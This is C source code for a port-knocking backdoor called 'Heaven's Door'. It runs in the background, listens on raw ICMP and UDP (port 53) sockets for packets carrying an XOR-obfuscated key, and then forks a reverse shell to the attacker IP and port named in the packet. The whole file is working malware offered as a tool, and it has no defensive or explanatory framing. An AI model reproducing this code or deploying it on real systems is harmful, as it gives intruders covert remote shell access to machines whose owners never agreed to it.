/* Heaven's Door
 *
 * Port-knocking backdoor using ICMP and UDP protocol
 * Author: F0rb1dd3n
 *
 * Would you like to knock knock on heavens door?
 *
 */

#include <stdio.h>
#include <sys/types.h> 
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <netdb.h>
#include <unistd.h>
#include <ctype.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <signal.h>
#include "hacking.h"

#define KEY		"F0rb1dd3n"
#define PACKET_SIZE 	1024

void icmp_listener(void){
	int sockfd, n, ksize;
	char buf[PACKET_SIZE + 1], key[] = KEY;
    	struct ip *ip;
	struct icmp *icmp;

	ksize = strlen(KEY);
	s_xor(key, 11, ksize);
    	
	if((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1) exit(-1);
	
	while(1){
        	bzero(buf, PACKET_SIZE + 1);        
        	n = recv(sockfd, buf, PACKET_SIZE, 0);
		if(n > 0){    
            		ip = (struct ip *)buf;
            		icmp = (struct icmp *)(ip + 1);
            
            		if((icmp->icmp_type == ICMP_ECHO) && (memcmp(icmp->icmp_data, key, ksize) == 0)){
                		char *attacker_ip, *data = (char *) malloc(ksize+24);
                		int attacker_port = 0;

				bzero(data, ksize+24);
				memcpy(data, icmp->icmp_data, ksize+24);
			
				s_xor(data, 11, strlen(data));
				
				strtok(data, " ");
				attacker_ip = strtok(NULL, " ");
				attacker_port = atoi(strtok(NULL, " "));
                		
				if((attacker_port <= 0) || (strlen(attacker_ip) < 7)){
					continue;
				} else {
                			if(fork() == 0){
						reverse_shell(attacker_ip, attacker_port);
                    				exit(EXIT_SUCCESS);
                			}
				}
				free(data);
            		}		
        	}
	}
}

void udp_listener(void) {
	int sockfd, n, ksize;
	char buf[PACKET_SIZE + 1], key[] = KEY;
	struct ip *ip;
	struct udphdr* udp;
	
	ksize = strlen(KEY);
	s_xor(key, 11, ksize);

	if((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1) exit(-1);

	while(1){
		bzero(buf, PACKET_SIZE + 1);
		n = recv(sockfd, buf, PACKET_SIZE, 0);
		if(n > 0){
			ip = (struct ip *)buf;
			udp = (struct udphdr *)(ip + 1);
			
			if((udp->dest == htons(53)) && (strstr(buf, key) == 0)){
                		char *attacker_ip, *data = (char *) malloc(ksize+24);
                		int attacker_port = 0;

				bzero(data, ksize+24);
				memcpy(data, buf + sizeof(struct iphdr) + sizeof(struct udphdr), ksize+24);

				s_xor(data, 11, strlen(data));
			
				strtok(data, " ");
				attacker_ip = strtok(NULL, " ");
				attacker_port = atoi(strtok(NULL, " "));
                		
				if((attacker_port <= 0) || (strlen(attacker_ip) < 7)){
					continue;
				} else {
                			if(fork() == 0){
						reverse_shell(attacker_ip, attacker_port);
                    				exit(EXIT_SUCCESS);
                			}
				}		
				free(data);		
			}
		}
	}
}

int main(int argc, char *argv[]){ 
   	pid_t pid;
	
	signal(SIGCLD, SIG_IGN); 
    	chdir("/");

	pid = fork();

	if(pid == -1) exit(-1);
	
	if(pid == 0) icmp_listener();

	if(pid > 0) {
		pid = fork();

		if(pid == -1) exit(-1);

		if(pid == 0) udp_listener();
	}

	return EXIT_SUCCESS;
}
